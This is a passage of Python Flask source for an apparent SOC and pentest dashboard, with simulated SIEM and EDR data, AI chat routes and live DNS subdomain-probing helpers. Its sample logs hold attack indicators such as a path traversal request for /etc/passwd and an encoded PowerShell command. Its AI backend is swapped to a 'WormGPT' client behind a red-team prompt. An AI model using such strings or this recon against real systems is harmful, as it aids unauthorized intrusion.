                "- 2. Block S3 public access\n\n"
                "[ThreatScore Analysis]\n"
                "- Score: 72/100 — CRITICAL\n"
                "- [Start Ollama: ollama serve && ollama pull dolphin-llama3:8b]"
            )
        if mode == 'individual':
            return (
                "[Recon Results]\n"
                "- Open Ports: 22, 80, 443, 8080\n"
                "- Detected Services: OpenSSH, Apache, nginx\n\n"
                "[Simulated Offensive Path]\n"
                "- SIMULATION: Port scan complete\n"
                "- SIMULATION: Apache version fingerprinted\n\n"
                "[Risk Level]\nMedium — Outdated Apache\n\n"
                "[Educational Recommendation]\n"
                "- Update Apache\n"
                "- [Start Ollama: ollama serve && ollama pull dolphin-llama3:8b]"
            )
        return (
            "[Alert Summary]\n"
            "- AI service unavailable\n\n"
            "[Recommended Action]\n"
            "- Run: ollama serve\n"
            "- Run: ollama pull dolphin-llama3:8b\n"
            "- Or set GEMINI_API_KEY in environment"
        )


# Start Ollama when app loads
start_ollama()

# ══════════════════════════════════════════════════════════════
# 6. SIMULATED ENTERPRISE TOOLS
# ══════════════════════════════════════════════════════════════
class SplunkService:
    SAMPLE_LOGS = [
        {"time":"2024-01-15 14:23:11","host":"192.168.1.45","source":"auth.log","event":"Failed password for root from 45.33.32.156 port 22 ssh2","severity":"High"},
        {"time":"2024-01-15 14:23:15","host":"192.168.1.45","source":"auth.log","event":"Failed password for root from 45.33.32.156 port 22 ssh2","severity":"High"},
        {"time":"2024-01-15 14:25:00","host":"WKSTN-042","source":"sysmon","event":"Process Create: powershell.exe -EncodedCommand JABjACAA...","severity":"Critical"},
        {"time":"2024-01-15 14:26:10","host":"DC-PROD-01","source":"security","event":"An account failed to log on. Account: svc_backup","severity":"Medium"},
        {"time":"2024-01-15 14:28:33","host":"app-server-03","source":"web","event":"GET /cgi-bin/../../../../etc/passwd HTTP/1.1 200","severity":"Critical"},
        {"time":"2024-01-15 14:30:00","host":"10.0.0.87","source":"dns","event":"Excessive TXT queries to d4t4-ex.xyz (487 in 60s)","severity":"High"},
    ]
    @staticmethod
    def search(query):
        q = query.lower()
        results = []
        for log in SplunkService.SAMPLE_LOGS:
            if not q or any(w in log['event'].lower() or w in log['host'].lower()
                            for w in q.split()):
                results.append(log)
        return results or SplunkService.SAMPLE_LOGS[:3]

class CrowdStrikeService:
    DETECTIONS = [
        {"id":"DET-001","host":"WKSTN-042","tactic":"Execution","technique":"T1059 - Command Scripting","severity":"Critical","status":"New","timestamp":"2024-01-15 14:25:00","detail":"PowerShell encoded command executed by non-admin user","ioc":"powershell.exe -EncodedCommand"},
        {"id":"DET-002","host":"DC-PROD-01","tactic":"Lateral Movement","technique":"T1550.002 - Pass the Hash","severity":"High","status":"In Progress","timestamp":"2024-01-15 14:26:10","detail":"NTLM hash reuse detected from svc_backup","ioc":"NTLM:aad3b435b51404ee"},
        {"id":"DET-003","host":"linux-prod-07","tactic":"Privilege Escalation","technique":"T1548.003 - Sudo Abuse","severity":"High","status":"New","timestamp":"2024-01-15 13:10:00","detail":"User dev_user executed /bin/bash via sudo","ioc":"/bin/bash"},
        {"id":"DET-004","host":"app-server-03","tactic":"Initial Access","technique":"T1190 - Exploit Public App","severity":"Critical","status":"New","timestamp":"2024-01-15 14:28:33","detail":"Apache path traversal exploit attempt","ioc":"../../../etc/passwd"},
        {"id":"DET-005","host":"10.0.0.87","tactic":"Exfiltration","technique":"T1048.003 - DNS Tunneling","severity":"Medium","status":"Closed","timestamp":"2024-01-15 14:30:00","detail":"DNS exfiltration to d4t4-ex.xyz","ioc":"d4t4-ex.xyz"},
    ]

class TenableService:
    SCAN_RESULTS = [
        {"host":"DC-PROD-01","ip":"10.0.0.1","cve":"CVE-2023-23397","cvss":9.8,"severity":"Critical","plugin":"Microsoft Outlook RCE","solution":"Apply KB5002271","exploitable":True},
        {"host":"app-server-03","ip":"10.0.0.14","cve":"CVE-2021-44228","cvss":10.0,"severity":"Critical","plugin":"Apache Log4j JNDI RCE","solution":"Upgrade Log4j to 2.17.1+","exploitable":True},
        {"host":"linux-prod-07","ip":"10.0.1.7","cve":"CVE-2023-4863","cvss":8.8,"severity":"High","plugin":"libwebp Heap Buffer Overflow","solution":"Update Chrome/libwebp","exploitable":False},
        {"host":"fw-edge-01","ip":"10.0.0.254","cve":"CVE-2023-20198","cvss":10.0,"severity":"Critical","plugin":"Cisco IOS XE Web UI","solution":"Apply Cisco advisory","exploitable":True},
        {"host":"DB-CLUSTER-01","ip":"10.0.2.10","cve":"CVE-2023-32315","cvss":7.5,"severity":"High","plugin":"Openfire Path Traversal","solution":"Upgrade Openfire","exploitable":False},
    ]

class SentinelService:
    INCIDENTS = [
        {"id":"INC-2024-001","title":"Multi-Stage Attack: Initial Access → Lateral Movement","severity":"High","status":"Active","mitre":["T1190","T1550","T1059"],"entities":["WKSTN-042","DC-PROD-01"],"created":"2024-01-15 14:25","tactics":"Initial Access, Lateral Movement, Execution"},
        {"id":"INC-2024-002","title":"Suspected Data Exfiltration via DNS","severity":"Medium","status":"Investigating","mitre":["T1048.003"],"entities":["10.0.0.87"],"created":"2024-01-15 14:30","tactics":"Exfiltration"},
        {"id":"INC-2024-003","title":"Brute Force Attack on SSH Service","severity":"High","status":"Active","mitre":["T1110"],"entities":["192.168.1.45"],"created":"2024-01-15 14:23","tactics":"Credential Access"},
    ]

class QRadarService:
    OFFENSES = [
        {"id":1,"description":"Multiple Failed Logins Followed by Success","magnitude":8,"status":"Open","events":487,"flows":23,"source":"45.33.32.156","destination":"192.168.1.45","category":"Authentication"},
        {"id":2,"description":"Potential C2 Beacon Detected","magnitude":9,"status":"Open","events":156,"flows":89,"source":"WKSTN-042","destination":"185.220.101.45","category":"Malware"},
        {"id":3,"description":"Abnormal Data Transfer Volume","magnitude":6,"status":"Investigating","events":34,"flows":210,"source":"10.0.0.87","destination":"8.8.8.8","category":"Exfiltration"},
    ]

# ══════════════════════════════════════════════════════════════
# 7. AI SERVICE
# ══════════════════════════════════════════════════════════════
INDIVIDUAL_PROMPT = """You are an AI Red Team Assistant for an ethical hacker.
Respond ONLY using this plain text structure (no markdown):
[Recon Results]
- Open Ports: (list)
- Detected Services: (list)
[Simulated Offensive Path]
- SIMULATION: (discovery)
- SIMULATION: (attempt)
- SIMULATION: (exploit test)
[Risk Level]
(Low/Medium/High + reason)
[Educational Recommendation]
- (what to secure next)
CRITICAL: Label all offensive actions as SIMULATION. Educational tone."""

ORGANIZATION_PROMPT = """You are an Enterprise SOC AI Orchestration Layer.
Respond ONLY using this plain text structure (no markdown):
[Alert Summary]
- (correlated alert findings)
[Related Vulnerabilities]
- (CVE IDs, CVSS, KEV status)
[Business Impact]
- (risk based on asset criticality)
[Recommended Action]
- (remediation / containment steps)
[Patch Availability]
- (vulnerable versions and fixes)
Professional SOC tone. Act as if querying live SIEM/EDR/Vuln databases."""

PROWLER_PROMPT = """You are a Cloud Security Expert specializing in Prowler findings.
When given Prowler scan results, analyze them and respond using:
[Executive Summary]
- (overall cloud security posture)
[Critical Findings]
- (list critical FAILs with CVE/check ID)
[Compliance Impact]
- (which frameworks are affected: CIS, NIST, PCI-DSS etc.)
[Remediation Priority]
- (ordered list of what to fix first with steps)
[ThreatScore Analysis]
- (explain the risk score and what drives it)
Professional cloud security tone."""

# ------------------------------------------------------------------
# 7. AI SERVICE (REPLACED BY WormGPT CLIENT)
# ------------------------------------------------------------------
# Import the client we just wrote.
from wormgpt_client import WormGPTClient

# Create a single global client – reused across requests.
wormgpt = WormGPTClient()

class AIService:
    """
    Minimal wrapper that forwards the chat request to WormGPT.
    Keeps the same public interface so the rest of the code can stay untouched.
    """

    @staticmethod
    def get_response(prompt: str, mode: str = "individual") -> str:
        """
        Forward the user prompt to the WormGPT client.

        Parameters
        ----------
        prompt : str
            Raw user input.
        mode : str
            One of 'individual', 'organization', or 'prowler'.
            Determines the system prompt used.

        Returns
        -------
        str
            The assistant’s plain‑text answer.
        """
        try:
            return wormgpt.chat(prompt, mode=mode)
        except Exception as exc:
            # Fallback: return a short error message – the frontend will display it.
            return f"[WormGPT] Error: {exc}"

    @staticmethod
    def _fallback(mode: str) -> str:
        """
        Legacy fallback (kept for reference).  
        The new implementation no longer needs this, but it’s useful if you
        want to keep the old “manual” prompts for quick testing.
        """
        if mode == "prowler":
            return (
                "[Executive Summary]\n"
                "- Cloud security posture is HIGH RISK — 11 critical/high findings detected\n"
                "- Root account lacks hardware MFA\n"
                "- S3 bucket public access\n"
                "\n[Critical Findings]\n"
                "- iam_root_hardware_mfa_enabled: Root MFA not enforced\n"
                "- s3_bucket_public_access: prod-data-bucket public\n"
                "\n[Compliance Impact]\n"
                "- CIS: 13 controls failing\n"
                "- PCI-DSS: 7 controls failing\n"
                "\n[Remediation Priority]\n"
                "- 1. Enable hardware MFA on root\n"
                "- 2. Block S3 public access\n"
                "\n[ThreatScore Analysis]\n"
                "- Score: 72/100 — CRITICAL\n"
                "- Driven by: 4 critical IAM/network misconfigurations\n"
                "- [Note: Set GEMINI_API_KEY for live AI analysis]"
            )
        elif mode == "individual":
            return (
                "[Recon Results]\n"
                "- Open Ports: 22, 80, 443, 8080\n"
                "- Detected Services: OpenSSH 8.4, Apache 2.4.51, nginx\n"
                "\n[Simulated Offensive Path]\n"
                "- SIMULATION: Port scan complete\n"
                "- SIMULATION: Apache version fingerprinted\n"
                "\n[Risk Level]\nMedium — Outdated Apache detected\n"
                "\n[Educational Recommendation]\n- Update Apache\n"
                "- Disable CGI modules\n"
                "- [Note: Set GEMINI_API_KEY for live responses]"
            )
        else:
            return (
                "[Alert Summary]\n"
                "- AI service unavailable\n"
                "\n[Recommended Action]\n"
                "- Run: ollama serve\n"
                "- Run: ollama pull dolphin-llama3:8b\n"
                "- Or set GEMINI_API_KEY in environment"
            )
# ══════════════════════════════════════════════════════════════
# 8. SEED DATA
# ══════════════════════════════════════════════════════════════
def seed_db():
    vulns = [
        ("CVE-2023-23397","Microsoft Outlook EoP — NTLMv2 hash leak",9.8,"Critical","Microsoft",2,True),
        ("CVE-2021-44228","Apache Log4Shell — JNDI RCE",10.0,"Critical","Apache",300,True),
        ("CVE-2023-4863","libwebp Heap Buffer Overflow in Chrome",8.8,"High","Google",15,False),
        ("CVE-2023-20198","Cisco IOS XE Web UI Priv Escalation",10.0,"Critical","Cisco",10,True),
        ("CVE-2023-32315","Openfire Path Traversal — unauthenticated admin",7.5,"High","Ignite Realtime",45,False),
        ("CVE-2023-34362","MOVEit Transfer SQL Injection — Cl0p ransomware",9.8,"Critical","Progress Software",60,True),
        ("CVE-2023-44487","HTTP/2 Rapid Reset DDoS",7.5,"High","IETF/Multiple",20,False),
        ("CVE-2022-47966","ManageEngine RCE via SAML",9.8,"Critical","Zoho",120,False),
    ]
    for cve, desc, score, sev, vendor, days, kev in vulns:
        if not Vulnerability.query.filter_by(cve_id=cve).first():
            db.session.add(Vulnerability(cve_id=cve, description=desc, cvss_score=score,
                severity=sev, published_date=datetime.utcnow() - timedelta(days=days),
                vendor_product=vendor, is_kev=kev))

    alerts = [
        ("ALT-001","Brute Force SSH Detected","Splunk","High","Open","487 failed SSH from 45.33.32.156","192.168.1.45"),
        ("ALT-002","Cobalt Strike C2 Beacon","CrowdStrike","Critical","Open","Beacon to 185.220.101.45:443","WKSTN-042"),
        ("ALT-003","Log4Shell Exploit Attempt","Sentinel","Critical","Open","JNDI in User-Agent header","app-server-03"),
        ("ALT-004","Pass-the-Hash Lateral Movement","CrowdStrike","High","Investigating","NTLM hash reuse svc_backup","DC-PROD-01"),
        ("ALT-005","DNS Tunneling Exfiltration","Splunk","Medium","Open","TXT queries to d4t4-ex.xyz","10.0.0.87"),
        ("ALT-006","Sudo Privilege Escalation","Sentinel","High","Open","dev_user → /bin/bash","linux-prod-07"),
    ]
    for aid, title, src, sev, stat, desc, host in alerts:
        if not SIEMAlert.query.filter_by(alert_id=aid).first():
            db.session.add(SIEMAlert(alert_id=aid, title=title, source=src, severity=sev,
                status=stat, description=desc, host=host,
                timestamp=datetime.utcnow() - timedelta(minutes=random.randint(5, 300))))

    assets = [
        ("DC-PROD-01","10.0.0.1","Windows Server 2022","Server","Critical","IT Infrastructure"),
        ("app-server-03","10.0.0.14","Ubuntu 22.04 LTS","Server","High","Engineering"),
        ("WKSTN-042","192.168.1.42","Windows 11 Pro","Workstation","Medium","Finance"),
        ("fw-edge-01","10.0.0.254","Cisco IOS XE 17.9","Network","Critical","Network Ops"),
        ("linux-prod-07","10.0.1.7","RHEL 9.2","Server","High","DevOps"),
        ("DB-CLUSTER-01","10.0.2.10","Ubuntu 20.04 LTS","Server","Critical","Data Engineering"),
    ]
    for hn, ip, os_name, tp, crit, dept in assets:
        if not Asset.query.filter_by(hostname=hn).first():
            db.session.add(Asset(hostname=hn, ip_address=ip, os_type=os_name, asset_type=tp,
                criticality=crit, department=dept,
                last_seen=datetime.utcnow() - timedelta(minutes=random.randint(1, 60))))
    db.session.commit()

# ══════════════════════════════════════════════════════════════
# 9. FORMS
# ══════════════════════════════════════════════════════════════
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    password = PasswordField('Password', validators=[DataRequired()])
    submit   = SubmitField('Login')

class ScanForm(FlaskForm):
    target = StringField('Target', validators=[DataRequired(), Length(min=3, max=100)])
    tool   = SelectField('Tool', choices=[
        ('nmap',      'Nmap — Network Port Discovery'),
        ('recon',     'Whois / DNS Recon'),
        ('nikto',     'Nikto — Web Vulnerability Scanner'),
        ('openvas',   'OpenVAS — Full Vulnerability Assessment'),
        ('shodan',    'Shodan — Infrastructure Intelligence'),
        ('harvester', 'theHarvester — Email & Subdomain OSINT'),
        ('recon_ng',  'Recon-ng — OSINT Framework'),
        ('dorks',     'Google Dorks — Search Query Generator'),
    ])
    authorized = BooleanField('I confirm I have written authorization to scan this target.',
                              validators=[DataRequired(message="Authorization required.")])
    submit = SubmitField('Launch Scan')
    def validate_target(self, field):
        try:
            SecurityUtils.validate_target(field.data)
        except ValueError as e:
            raise ValidationError(str(e))

class VulnFilterForm(FlaskForm):
    search   = StringField('Search', validators=[Optional(), Length(max=100)])
    severity = SelectField('Severity', choices=[('All','All'), ('Critical','Critical'),
                           ('High','High'), ('Medium','Medium'), ('Low','Low')])
    submit   = SubmitField('Filter')

class UserForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=3, max=50)])
    password = PasswordField('Password', validators=[DataRequired(), Length(min=8)])
    role     = SelectField('Role', choices=[('analyst','Analyst'), ('admin','Admin')])
    submit   = SubmitField('Create User')

# ══════════════════════════════════════════════════════════════
# 10. ROUTES — AUTH
# ══════════════════════════════════════════════════════════════
@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('mode_selection'))
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user and user.check_password(form.password.data) and user.is_active_user:
            login_user(user)
            return redirect(request.args.get('next') or url_for('mode_selection'))
        flash('Invalid credentials.', 'danger')
    return render_template('login.html', form=form)

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def mode_selection():
    return render_template('mode_selection.html')

@app.route('/set-mode/<mode>')
@login_required
def set_mode(mode):
    if mode in ('individual', 'organization', 'pentest'):
        current_user.mode = mode
        db.session.commit()
        session['mode'] = mode
    if mode == 'individual': return redirect(url_for('individual_dashboard'))
    if mode == 'pentest':    return redirect(url_for('pentest_dashboard'))
    return redirect(url_for('org_dashboard'))

# ══════════════════════════════════════════════════════════════
# 11. ROUTES — INDIVIDUAL
# ══════════════════════════════════════════════════════════════
@app.route('/individual')
@login_required
def individual_dashboard():
    session['mode'] = 'individual'
    logs  = AuditLog.query.filter_by(user_id=current_user.id).order_by(AuditLog.timestamp.desc()).limit(5).all()
    total = AuditLog.query.filter_by(user_id=current_user.id).count()
    return render_template('individual/dashboard.html', logs=logs, total_scans=total)

@app.route('/individual/scan', methods=['GET', 'POST'])
@login_required
def individual_scan():
    session['mode'] = 'individual'
    form   = ScanForm()
    result = None
    target_display = None
    tool_name      = None
    if form.validate_on_submit():
        target = form.target.data
        tc     = form.tool.data
        scanner_map = {
            'nmap':      NmapWrapper,
            'recon':     WhoisWrapper,
            'nikto':     NiktoWrapper,
            'openvas':   OpenVASWrapper,
            'shodan':    ShodanWrapper,
            'harvester': HarvesterWrapper,
            'recon_ng':  ReconNGWrapper,
            'dorks':     GoogleDorkWrapper,
        }
        result         = scanner_map.get(tc, WhoisWrapper)().run(target)
        target_display = target
        tool_name      = dict(form.tool.choices).get(tc, tc)
        flash(f'Scan complete: {tool_name} on {target}', 'success')
    return render_template('individual/scan.html', form=form,
                           result=result, target=target_display, tool_name=tool_name)

@app.route('/individual/chat')
@login_required
def individual_chat():
    session['mode'] = 'individual'
    msgs = ChatMessage.query.filter_by(user_id=current_user.id, mode='individual').order_by(ChatMessage.timestamp).all()
    return render_template('individual/chat.html', messages=msgs)

@app.route('/individual/history')
@login_required
def individual_history():
    session['mode'] = 'individual'
    logs = AuditLog.query.filter_by(user_id=current_user.id).order_by(AuditLog.timestamp.desc()).all()
    return render_template('individual/history.html', logs=logs)

# ══════════════════════════════════════════════════════════════
# 12. ROUTES — ORGANIZATION
# ══════════════════════════════════════════════════════════════
@app.route('/org')
@login_required
def org_dashboard():
    session['mode'] = 'organization'
    return render_template('org/dashboard.html',
        alert_count   = SIEMAlert.query.filter_by(status='Open').count(),
        critical_count= SIEMAlert.query.filter_by(severity='Critical', status='Open').count(),
        asset_count   = Asset.query.count(),
        vuln_count    = Vulnerability.query.filter(Vulnerability.cvss_score >= 7.0).count(),
        ticket_count  = ServiceNowTicket.query.count(),
        recent_alerts = SIEMAlert.query.order_by(SIEMAlert.timestamp.desc()).limit(5).all())

@app.route('/org/alerts')
@login_required
def org_alerts():
    session['mode'] = 'organization'
    src  = request.args.get('source',   'All')
    sev  = request.args.get('severity', 'All')
    stat = request.args.get('status',   'All')
    q    = SIEMAlert.query
    if src  != 'All': q = q.filter_by(source=src)
    if sev  != 'All': q = q.filter_by(severity=sev)
    if stat != 'All': q = q.filter_by(status=stat)
    return render_template('org/alerts.html',
        alerts=q.order_by(SIEMAlert.timestamp.desc()).all(),
        source=src, severity=sev, status=stat)

@app.route('/org/alerts/<int:aid>/update', methods=['POST'])
@login_required
def update_alert(aid):
    a  = SIEMAlert.query.get_or_404(aid)
    ns = request.form.get('status')
    if ns in ('Open', 'Investigating', 'Closed'):
        a.status = ns
        db.session.commit()
    return redirect(url_for('org_alerts'))

@app.route('/org/assets')
@login_required
def org_assets():
    session['mode'] = 'organization'
    return render_template('org/assets.html', assets=Asset.query.all())

@app.route('/org/vulnerabilities')
@login_required
def org_vulnerabilities():
    session['mode'] = 'organization'
    form = VulnFilterForm(request.args)
    q    = Vulnerability.query
    if form.search.data:
        q = q.filter(Vulnerability.vendor_product.ilike(f'%{form.search.data}%'))
    if form.severity.data and form.severity.data != 'All':
        q = q.filter_by(severity=form.severity.data)
    return render_template('org/vulnerabilities.html', form=form,
        vulns=q.order_by(Vulnerability.is_kev.desc(), Vulnerability.cvss_score.desc()).all())

@app.route('/org/patch')
@login_required
def org_patch():
    session['mode'] = 'organization'
    return render_template('org/patch.html',
        vulns=Vulnerability.query.order_by(
            Vulnerability.is_kev.desc(), Vulnerability.cvss_score.desc()).all())

@app.route('/org/integrations')
@login_required
def org_integrations():
    session['mode'] = 'organization'
    return render_template('org/integrations.html')

@app.route('/org/chat')
@login_required
def org_chat():
    session['mode'] = 'organization'
    msgs = ChatMessage.query.filter_by(
        user_id=current_user.id, mode='organization').order_by(ChatMessage.timestamp).all()
    return render_template('org/chat.html', messages=msgs)

# Simulated tool API endpoints
@app.route('/api/splunk/search', methods=['POST'])
@login_required
def splunk_search():
    q = request.json.get('query', '')
    return jsonify({'status':'success', 'results':SplunkService.search(q), 'query':q, 'elapsed':'0.42s'})

@app.route('/api/crowdstrike/detections')
@login_required
def cs_detections():
    return jsonify({'status':'success', 'detections':CrowdStrikeService.DETECTIONS})

@app.route('/api/tenable/scans')
@login_required
def tenable_scans():
    return jsonify({'status':'success', 'results':TenableService.SCAN_RESULTS})

@app.route('/api/sentinel/incidents')
@login_required
def sentinel_incidents():
    return jsonify({'status':'success', 'incidents':SentinelService.INCIDENTS})

@app.route('/api/qradar/offenses')
@login_required
def qradar_offenses():
    return jsonify({'status':'success', 'offenses':QRadarService.OFFENSES})

@app.route('/api/servicenow/tickets')
@login_required
def snow_tickets():
    tickets = ServiceNowTicket.query.order_by(ServiceNowTicket.created_at.desc()).all()
    return jsonify({'status':'success', 'tickets':[{
        'inc_number': t.inc_number, 'title': t.title, 'priority': t.priority,
        'status': t.status, 'source': t.source, 'assigned_to': t.assigned_to,
        'created_at': t.created_at.strftime('%Y-%m-%d %H:%M')} for t in tickets]})

@app.route('/api/servicenow/create', methods=['POST'])
@login_required
def snow_create():
    d   = request.json
    inc = f"INC{random.randint(1000000, 9999999)}"
    t   = ServiceNowTicket(
        inc_number  = inc,
        title       = d.get('title', 'New Ticket'),
        description = d.get('description', ''),
        priority    = d.get('priority', 'Medium'),
        source      = d.get('source', 'Manual'),
        status      = 'New')
    db.session.add(t)
    db.session.commit()
    return jsonify({'status':'success', 'inc_number':inc, 'ticket_id':t.id})

@app.route('/api/servicenow/update/<int:tid>', methods=['POST'])
@login_required
def snow_update(tid):
    t  = ServiceNowTicket.query.get_or_404(tid)
    ns = request.json.get('status')
    if ns in ('New', 'In Progress', 'Resolved', 'Closed'):
        t.status = ns
        db.session.commit()
    return jsonify({'status':'success'})

# ══════════════════════════════════════════════════════════════
# 13. ROUTES — PROWLER
# ══════════════════════════════════════════════════════════════
@app.route('/prowler')
@login_required
def prowler_dashboard():
    session['mode'] = 'organization'
    scans        = ProwlerScan.query.order_by(ProwlerScan.started_at.desc()).limit(10).all()
    latest       = next((s for s in scans if s.status == 'completed'), None)
    findings     = json.loads(latest.findings_json) if latest and latest.findings_json else []
    threat_score = ProwlerService.get_threat_score(findings) if findings else 0
    return render_template('prowler/dashboard.html',
        scans=scans, latest=latest, findings=findings,
        threat_score=threat_score, compliance=COMPLIANCE_FRAMEWORKS)

@app.route('/prowler/scan', methods=['POST'])
@login_required
def prowler_start_scan():
    provider = request.json.get('provider', 'aws')
    creds    = request.json.get('credentials', {})
    scan_id  = str(uuid.uuid4())[:8]
    scan     = ProwlerScan(scan_id=scan_id, provider=provider, status='running')
    db.session.add(scan)
    db.session.commit()
    t = threading.Thread(target=_run_prowler_bg,
                     args=(app, scan_id, provider, creds))
    t.daemon = True
    t.start()
    return jsonify({'status':'success', 'scan_id':scan_id})

def _run_prowler_bg(app_ctx, scan_id, provider, creds):
    with app_ctx.app_context():
        ProwlerService.run_scan(scan_id, provider, creds)

@app.route('/prowler/status/<scan_id>')
@login_required
def prowler_status(scan_id):
    scan = ProwlerScan.query.filter_by(scan_id=scan_id).first_or_404()
    return jsonify({'status':scan.status, 'pass':scan.total_pass,
                    'fail':scan.total_fail, 'warn':scan.total_warn})

@app.route('/prowler/findings/<scan_id>')
@login_required
def prowler_findings(scan_id):
    scan     = ProwlerScan.query.filter_by(scan_id=scan_id).first_or_404()
    findings = json.loads(scan.findings_json) if scan.findings_json else []
    return jsonify({'status':'success', 'findings':findings,
                    'threat_score':ProwlerService.get_threat_score(findings)})

@app.route('/prowler/chat')
@login_required
def prowler_chat():
    session['mode'] = 'prowler'
    msgs   = ChatMessage.query.filter_by(
        user_id=current_user.id, mode='prowler').order_by(ChatMessage.timestamp).all()
    latest = ProwlerScan.query.filter_by(status='completed').order_by(
        ProwlerScan.started_at.desc()).first()
    return render_template('prowler/chat.html', messages=msgs, latest_scan=latest)

# ══════════════════════════════════════════════════════════════
# 14. ROUTES — AI CHAT API
# ══════════════════════════════════════════════════════════════
@app.route('/api/chat', methods=['POST'])
@login_required
def api_chat():
    try:
        d      = request.get_json()
        prompt = (d.get('prompt') or '').strip()
        mode   = d.get('mode', session.get('mode', 'individual'))

        if not prompt:
            return jsonify({'status':'error', 'message':'Empty prompt'}), 400

        if mode == 'prowler':
            latest = ProwlerScan.query.filter_by(status='completed').order_by(
                ProwlerScan.started_at.desc()).first()
            if latest and latest.findings_json:
                findings = json.loads(latest.findings_json)
                fails    = [f for f in findings if f['status'] == 'FAIL'][:8]
                context  = f"Prowler scan results ({latest.provider.upper()}, {latest.total_fail} failures):\n"
                for f in fails:
                    context += f"- [{f['severity'].upper()}] {f['check_id']}: {f['description']}\n"
                prompt = context + "\nUser question: " + prompt

        db.session.add(ChatMessage(
            user_id=current_user.id,
            role='user',
            content=d.get('prompt'),
            mode=mode
        ))
        db.session.commit()

        ai_text = AIService.get_response(prompt, mode)

        db.session.add(ChatMessage(
            user_id=current_user.id,
            role='ai',
            content=ai_text,
            mode=mode
        ))
        db.session.commit()

        # ← Fixed: return both formats so any frontend works
        return jsonify({
            'status': 'success',
            'data':   ai_text,
            'reply':  ai_text
        })

    except Exception as e:
        import traceback
        logging.error(traceback.format_exc())
        return jsonify({
            'status':  'error',
            'message': str(e)
        }), 500
# ══════════════════════════════════════════════════════════════
# 15. ROUTES — ADMIN
# ══════════════════════════════════════════════════════════════
@app.route('/admin/users')
@login_required
def admin_users():
    if current_user.role != 'admin':
        flash('Access denied.', 'danger')
        return redirect(url_for('mode_selection'))
    return render_template('admin/users.html', users=User.query.all(), form=UserForm())

@app.route('/admin/users/create', methods=['POST'])
@login_required
def admin_create_user():
    if current_user.role != 'admin':
        return redirect(url_for('mode_selection'))
    form = UserForm()
    if form.validate_on_submit():
        if User.query.filter_by(username=form.username.data).first():
            flash('Username already exists.', 'danger')
        else:
            u = User(username=form.username.data, role=form.role.data)
            u.set_password(form.password.data)
            db.session.add(u)
            db.session.commit()
            flash(f'User {form.username.data} created.', 'success')
    return redirect(url_for('admin_users'))

@app.route('/admin/users/<int:uid>/toggle', methods=['POST'])
@login_required
def admin_toggle_user(uid):
    if current_user.role != 'admin':
        return redirect(url_for('mode_selection'))
    u = User.query.get_or_404(uid)
    if u.id != current_user.id:
        u.is_active_user = not u.is_active_user
        db.session.commit()
        flash(f'User {"enabled" if u.is_active_user else "disabled"}.', 'success')
    return redirect(url_for('admin_users'))

# ══════════════════════════════════════════════════════════════
# 16. ROUTES — EXPORTS
# ══════════════════════════════════════════════════════════════
@app.route('/export/scan-history.csv')
@login_required
def export_scans():
    logs = AuditLog.query.filter_by(user_id=current_user.id).all()
    out  = io.StringIO()
    w    = csv.writer(out)
    w.writerow(['Timestamp', 'Target', 'Tool', 'Status', 'Summary'])
    for l in logs:
        w.writerow([l.timestamp.strftime('%Y-%m-%d %H:%M:%S'), l.target, l.tool_used,
                    l.status, (l.output_summary or '')[:200]])
    out.seek(0)
    return Response(out, mimetype='text/csv',
                    headers={'Content-Disposition':'attachment;filename=scan_history.csv'})

@app.route('/export/vulnerabilities.csv')
@login_required
def export_vulns():
    vulns = Vulnerability.query.order_by(Vulnerability.cvss_score.desc()).all()
    out   = io.StringIO()
    w     = csv.writer(out)
    w.writerow(['CVE ID', 'Severity', 'CVSS', 'Vendor', 'KEV', 'Description'])
    for v in vulns:
        w.writerow([v.cve_id, v.severity, v.cvss_score, v.vendor_product,
                    'Yes' if v.is_kev else 'No', v.description])
    out.seek(0)
    return Response(out, mimetype='text/csv',
                    headers={'Content-Disposition':'attachment;filename=vulnerabilities.csv'})

@app.route('/export/alerts.csv')
@login_required
def export_alerts():
    alerts = SIEMAlert.query.order_by(SIEMAlert.timestamp.desc()).all()
    out    = io.StringIO()
    w      = csv.writer(out)
    w.writerow(['Alert ID', 'Title', 'Source', 'Severity', 'Status', 'Host', 'Timestamp'])
    for a in alerts:
        w.writerow([a.alert_id, a.title, a.source, a.severity, a.status,
                    a.host, a.timestamp.strftime('%Y-%m-%d %H:%M:%S')])
    out.seek(0)
    return Response(out, mimetype='text/csv',
                    headers={'Content-Disposition':'attachment;filename=alerts.csv'})

@app.route('/export/prowler.csv')
@login_required
def export_prowler():
    latest   = ProwlerScan.query.filter_by(status='completed').order_by(
        ProwlerScan.started_at.desc()).first()
    findings = json.loads(latest.findings_json) if latest and latest.findings_json else []
    out      = io.StringIO()
    w        = csv.writer(out)
    w.writerow(['Check ID','Service','Severity','Status','Region','Resource','Description','Remediation'])
    for f in findings:
        w.writerow([f.get('check_id'), f.get('service'), f.get('severity'), f.get('status'),
                    f.get('region'), f.get('resource'), f.get('description'), f.get('remediation')])
    out.seek(0)
    return Response(out, mimetype='text/csv',
                    headers={'Content-Disposition':'attachment;filename=prowler_findings.csv'})

# ══════════════════════════════════════════════════════════════
# 17. PENTEST LAB — TOOL REGISTRY & ROUTES
# ══════════════════════════════════════════════════════════════

    # ══════════════════════════════════════════════════════════════
# REAL LOOKUP HELPERS — called by OSINT tools
# ══════════════════════════════════════════════════════════════

def _real_dns(target):
    """Do real DNS resolution and subdomain probing."""
    lines = []
    # Real A record
    try:
        ip = _socket.gethostbyname(target)
        lines.append(f"[DNS — LIVE]\nA     → {ip}")
    except Exception as e:
        ip = "unresolved"
        lines.append(f"[DNS — LIVE]\nA     → Could not resolve ({e})")
 
    # Real MX/TXT/NS via dnspython
    try:
        import dns.resolver
        for rtype in ['MX', 'TXT', 'NS', 'AAAA']:
            try:
                for r in dns.resolver.resolve(target, rtype, lifetime=5):
                    lines.append(f"{rtype:<6} → {r.to_text()}")
            except Exception:
                pass
    except ImportError:
        lines.append(f"MX/NS/TXT → run: pip install dnspython for full records")
 
    # Real subdomain probe
    lines.append(f"\n[SUBDOMAIN PROBE — LIVE DNS]")
    found = []
    for sub in ['www', 'mail', 'vpn', 'dev', 'api', 'ftp',
                'smtp', 'portal', 'admin', 'staging', 'webmail', 'mx']:
        try:
            full = f"{sub}.{target}"
